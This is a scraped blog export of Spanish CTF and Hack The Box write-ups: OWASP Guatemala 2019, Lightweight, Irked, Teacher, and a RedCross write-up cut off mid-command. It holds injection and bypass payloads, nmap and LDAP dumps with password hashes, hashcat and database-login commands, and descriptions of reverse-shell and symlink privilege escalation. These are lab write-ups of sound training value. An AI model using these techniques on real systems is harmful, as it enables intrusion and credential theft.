1=1 or 'x'='y\nflag{XPATH_1NJ3CT10N}\nBYPASS Utilizamos el siguiente payload en metodo POST para obtener la bandera.\nPayload: ?password[]=\u0026quot;\u0026quot;\nhttp://ctf.develsecurity.com:84/login.php?password[]=%22%22\nflag{bypass_strcmp_function}\nFORENSICS Para este reto revisamos todas las conexiones que se hicieron durante el volcado de memoria de este archivo, no enocontramos alguna ip que se ejecutara bajo un proceso en especifico. Asumiendo que al realizar este volcado de memoria se identifico a algun tipo de intruso en la computadora revisamos el \u0026ldquo;historial\u0026rdquo; de comandos y encontramos que antes de realizar el volcado de memoria el usuario hizo ping a una direccion que no aparece por ningun lado (sockets,socketscan,connscan,etc).\nflag: 192.168.21.161\nNSA.ZIP[raw] Para este reto utilizamos volatility y algunos de sus comandos para obtener las flags.\nProfile: Win7SP1x64\nHASH NTLM flag:31d6cfe0d16ae931b73c59d7e0c089c0\nUSER flag: victim\nPID Pid del proceso wmpnetwk.exe.\nflag: 2464\nSIDs flag: S-1-5-21-3480093824-3207195214-1800084707-1001\nCOMPUTER NAME flag:VICTIM-PC\nOSINT IP NSA Utilizamos algunas paginas para obtener informacion del historial de IPs de nsa.gov.\nhttps://myip.ms/\nNuestra flag: flag{23.196.119.211}\n1 23.196.119.211 United States Akamai Technologies, Inc. 2016-08-25 SEXY Utilizamos Google Images para hacer una busqueda de la imagen e informacion.\nflag: tiffanytrump\nSTUX flag: 1096100\nNetworking NETWORKING1 Utilizamos Wireshark y un filtro para el puerto 21 FTP.\ntcp.port==21 ftp flag{sn1ff1ng_ftp_cr3dent1als}\nNETWORKING2 http.request.method == \u0026ldquo;POST\u0026rdquo; flag{http_1nsecure_commun1cat1on}\n","description":"OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.","id":205,"section":"posts","tags":[""],"title":"OWASP CTF 2019 Guatemala - Writeup","uri":"https://sckull.github.io/posts/owasp2019/"},{"content":"\rNos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH. Cambiamos al siguiente usuario tras crackear la contraseña encontrada en una conexion de LDAP. Realizamos la lectura de la flag root utilizando openssl.\nInformacion de la Maquina Nombre Lightweight OS Linux Puntos 30 Dificultad Media IP 10.10.10.119 Maker 0xEA31\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.3, 6.1, 4.5, 5.5, 3.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Nmap 7.70 scan initiated Thu Jan 10 15:20:40 2019 as: nmap -sC -sV -o tcp 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.20s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA) | 256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA) |_ 256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ssl-cert: Subject: commonName=lightweight.htb | Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain | Not valid before: 2018-06-09T13:32:51 |_Not valid after: 2019-06-09T13:32:51 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:21:22 2019 -- 1 IP address (1 host up) scanned in 41.92 seconds NMAP SCRIPT: LDAPSEARCH Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 Nmap 7.70 scan initiated Thu Jan 10 15:40:00 2019 as: nmap -sC -sV -p389 --script=ldap-search -o ldap-nmap 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.18s latency). PORT STATE SERVICE VERSION 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ldap-search: | Context: dc=lightweight,dc=htb | dn: dc=lightweight,dc=htb | objectClass: top | objectClass: dcObject | objectClass: organization | o: lightweight htb | dc: lightweight | dn: cn=Manager,dc=lightweight,dc=htb | objectClass: organizationalRole | cn: Manager | description: Directory Manager | dn: ou=People,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: People | dn: ou=Group,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: Group | dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb | uid: ldapuser1 | cn: ldapuser1 | sn: ldapuser1 | mail: ldapuser1@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1000 | gidNumber: 1000 | homeDirectory: /home/ldapuser1 | dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb | uid: ldapuser2 | cn: ldapuser2 | sn: ldapuser2 | mail: ldapuser2@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1001 | gidNumber: 1001 | homeDirectory: /home/ldapuser2 | dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser1 | userPassword: {crypt}x | gidNumber: 1000 | dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser2 | userPassword: {crypt}x |_ gidNumber: 1001 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:40:14 2019 -- 1 IP address (1 host up) scanned in 14.17 seconds HASHCAT Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.\n1 hashcat -m 1800 -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt 1 2 $6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ $6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 HTTP Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje This site is protected by agains bruteforging..\nAl visitar las paginas disponibles encontramos\nAl visitar la pagina de user nos muestra un mensaje This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... , la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.\nLIMITED SSH Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.\nYa que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas capacidades (getcap/setcap).\nEncontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene CAP_NET_ADMIN y CAP_NET_RAW, para realizar operaciones relacionadas a la red.\nLDAPUSER2 TCPDUMP Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.\nAl realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.\nUtilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el user.txt flag.\nLDAPUSER1 En nuestra carpeta como usuario ldapuser2 encontramos un archivo backup.7z al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello 7z2hashcat.pl nos fue de gran ayuda.\nAl descomprimir el contenido de backup.7z encontramos lo siguiente.\nAnalizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en status.php.\nUtilizamos las credenciales.\nROOT FLAG - OPENSSL Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.\nUtilizamos openssl para hacer bypass (openssl), leer y escribir archivos. En este caso vamos a utilizar openssl para leer el root.txt flag que se encuentra en /root/root.txt.\n","description":"Nos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH. Cambiamos al siguiente usuario tras crackear la contraseña encontrada en una conexion de LDAP. Realizamos la lectura de la flag root utilizando openssl.","id":206,"section":"posts","tags":["capabilities","tcpdump","openssl"],"title":"Hack The Box - Lightweight","uri":"https://sckull.github.io/posts/lightweight/"},{"content":"\rIrked tiene expuesto el puerto de UnrealIRCd el cual tiene un backdoor, lo que nos dio acceso a la maquina. El siguiente usuario lo obtuvimos por medio de un reto de Esteganografia. Escalamos privilegios mediante un fichero el cual ejecutaba un script donde agregamos una shell inversa.\nNombre Irked OS Linux Puntos 20 Dificultad Facil IP 10.10.10.117 Maker MrAgent\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 4.7, 6.6, 3.4, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 5, 8, 2, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.117 Host is up (0.081s latency). Not shown: 65205 closed ports, 323 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 47041/udp status |_ 100024 1 48216/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 48216/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=4/26%OT=22%CT=1%CU=31533%PV=Y%DS=2%DC=T%G=Y%TM=5CC2690 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 113/tcp) HOP RTT ADDRESS 1 83.76 ms 10.10.14.1 2 83.73 ms 10.10.10.117 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2041.57 seconds. HTTP La pagina inicial nos muestra una imagen y una frase acerca de IRC.\nGOBUSTER Escaneo de directorios y archivos.\n1 2 3 4 5 gobuster -u 10.10.10.117 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) SHELL - UnrealIRCd Para UnrealIRCd existe un backdoor el cual se puede explotar mediante un exploit existente en metasploit quiza el mensaje de la pagina principal se referia a esta vulnerabilidad, vamos configuramos el exploit.\nExploit Payload Obtenemos una Shell con el exploit\nEn el directorio principal carpeta Documents encontramos un archivo llamado .backup con un mensaje y una frase, el mensaje habla acerca de steg que se puede referir a steganography pero no encontramos ninguna imagen en los directorios, en la pagina principal se encuentra una imagen vamos a utilizarla para extraer informacion que pueda esconder dentro.\n1 2 Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss Stego - IRKED Utilizamos steghide para extraer la informacion dentro de la imagen con la frase y encontramos una contraseña.\nSHELL - Djmardov Utilizamos la contraseña que encontramos en la imagen en ssh, obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Buscamos archivos SUID para escalar privilegios\nEncontramos un archivo /usr/bin/viewuser que al ejecutarlo nos envia un error donde /tmp/listusers no existe.\nPara obtener una shell root agregamos una shell inversa al archivo que no existe, damos permisos al archivo y lo ejecutamos.\nObtenemos nuestra shell root y nuestra bandera root.txt.\n","description":"Irked tiene expuesto el puerto de UnrealIRCd el cual tiene un backdoor, lo que nos dio acceso a la maquina. El siguiente usuario lo obtuvimos por medio de un reto de Esteganografia. Escalamos privilegios mediante un fichero el cual ejecutaba un script donde agregamos una shell inversa.","id":207,"section":"posts","tags":["UnrealIRC","metasploit","steganography","steghide","suid"],"title":"Hack The Box - Irked","uri":"https://sckull.github.io/posts/irked/"},{"content":"\rEncontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle. Explotamos una vulnerabilidad en Moodle lo que nos dio acceso, y que con credenciales de la base de datos de esta plataforma accedimos a un segundo usuario crackeando los Hashes encontrados. Obtuvimos la flag root creando un link simbolico.\nNombre Teacher OS Linux Puntos 20 Dificultad Facil IP 10.10.10.153 Maker Gioo\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.2, 4.9, 6.1, 3.9, 5.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 6, 7, 3, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos TCP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Nmap 7.70 scan initiated Thu Apr 18 22:50:41 2019 as: nmap -sT -A -sV -o nmap.scan 10.10.10.153 Nmap scan report for 10.10.10.153 Host is up (0.31s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Device type: WAP Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4.20 OS details: Tomato 1.28 (Linux 2.4.20) Network Distance: 2 hops TRACEROUTE (using proto 1/icmp) HOP RTT ADDRESS 1 296.09 ms 10.10.12.1 2 300.57 ms 10.10.10.153 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 18 22:52:41 2019 -- 1 IP address (1 host up) scanned in 120.38 seconds GOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt,js -t 15 /css (Status: 301) /fonts (Status: 301) /gallery.html (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /manual (Status: 301) /moodle (Status: 301) /phpmyadmin (Status: 403) /server-status (Status: 403) HTTP Pagina Principal\n/Moodle Login /phpmyadmin /gallery.html En gallery.html encontramos codigo javascript que imprime un mensaje.\nJunto al codigo hay una imagen, pero no podemos verla.\nDescargamos la imagen con curl y nos muestra un mensaje que contiene la imagen.\nNos dice que debemos de encontrar el caracter faltante para la contraseña Th4C00lTheacha del usuario Giovanni.\nBURPSUITE - Giovanni Password Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos /usr/share/wordlists/dirb/stress/alphanum_case_extra.txt.\nEncontramos que el caracter faltante para la contraseña es #.\nMoodle Utilizando las credenciales Giovanni y Th4C00lTheacha# logramos ingresar a Moodle.\nEvil Teacher - Reverse Shell Para nuestra version de moodle encontramos una vulnerabilidad que puede injectar codigo, para ello vamos a crear un Quiz en el curso de Algebra y vamos a agregar una formula de matematica la cual nos va a ayudar a inyectar codigo.\nEvil Teacher: Remote Code Execution Obtenemos una shell como www-data.\nUSER - Giovanni Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.\n1 2 3 4 5 6 7 8 9 10 11 12 13 $CFG-\u0026gt;dbtype = \u0026#39;mariadb\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;root\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;Welkom1!\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8mb4_unicode_ci\u0026#39;, ); Nos conectamos a la base de datos\n1 mariadb -u root -p\u0026#39;Welkom1!\u0026#39; -D moodle Encontramos una tabla con usuarios y contraseña.\n1 select username,password from mdl_user;select username,password from mdl_user; Crackeamos la contraseña de Giovanibak en https://crackstation.net/.\n1 7a860966115182402ed06375cf0a22af =\u0026gt; expelled Utilizamos la contraseña con el usuario Giovanni y obtenemos nuestra bandera user.txt.\nROOT - flag Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de Giovanni.\n1 2 3 4 5 6 7 /usr/bin/backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R; Para obtener nuestra bandera root.txt vamos a untilizar un symlink y lo vamos a apuntar hacia el directorio /root/ donde esta nuestra bandera para que el archivo cuando se ejecute comprima lo que esta en /root/ al archivo backup_courses.tar.gz y poder descomprimirlo, para ello vamos a renombrar courses.\nLuego de un minuto se crea el archivo backup_courses.tar.gz lo descomprimimos y obtenemos nuestra bandera root.txt.\n","description":"Encontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle. Explotamos una vulnerabilidad en Moodle lo que nos dio acceso, y que con credenciales de la base de datos de esta plataforma accedimos a un segundo usuario crackeando los Hashes encontrados.  Obtuvimos la flag root creando un link simbolico.","id":208,"section":"posts","tags":["moodle","Evil Teacher","cron"],"title":"Hack The Box - Teacher","uri":"https://sckull.github.io/posts/teacher/"},{"content":"\rEn RedCross realizamos una enumeracion a un subdominos donde encontramos una funcion de la aplicacion web que nos permite crear un acceso temporal por SSH a una shell limitada, dentro de los parametros de esta accion descrita realizamos Command Inyeccion lo que nos dio acceso aun primer usuario. Finalmente tomamos ventaja de una funcionalidad de la aplicacion para agregar un usario y obtener acceso root.\nNombre RedCross OS Linux Puntos 30 Dificultad Media IP 10.10.10.113 Maker ompamo\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.3, 7.8, 6.4, 3.6, 2.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Al realizar el primer escaneo a la maquina obtuvimos lo siguiente y al parecer tiene un subdominio (intra).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Nmap 7.70 scan initiated Mon Jan 14 18:47:33 2019 as: nmap -sC -sV -o tcp 10.10.10.113 Nmap scan report for 10.10.10.113 Host is up (0.22s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0) | ssh-hostkey: | 2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA) | 256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA) |_ 256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519) 80/tcp open http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ 443/tcp open ssl/http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ | ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US | Not valid before: 2018-06-03T19:46:58 |_Not valid after: 2021-02-27T19:46:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 http/1.1 (1000 Lineas de lo mismo) |_ http/1.1 Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 14 19:47:25 2019 -- 1 IP address (1 host up) scanned in 3592.63 seconds Subdominios Agregamos el subdominio intra a nuestro archivo local /etc/hosts.\n1 10.10.10.113\tredcross.htb intra.redcross.htb Al visitar intra.redcross.htb nos muestra un login, podemos probar contraseñas comunes o seguir enumerando la pagina, en este caso el usuario:contraseña que encontramos fue: guest:guest.\nGOBUSTER Realizamos una busqueda de los directorios y archivos (php,html,txt,pdf,doc) que podrian estar en la pagina, utilizamos el parametro \u0026lsquo;-k\u0026rsquo; saltarnos la verificacion de SSL de la pagina (-k Skip SSL certificate verification).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 gobuster -u https://intra.redcross.htb -w 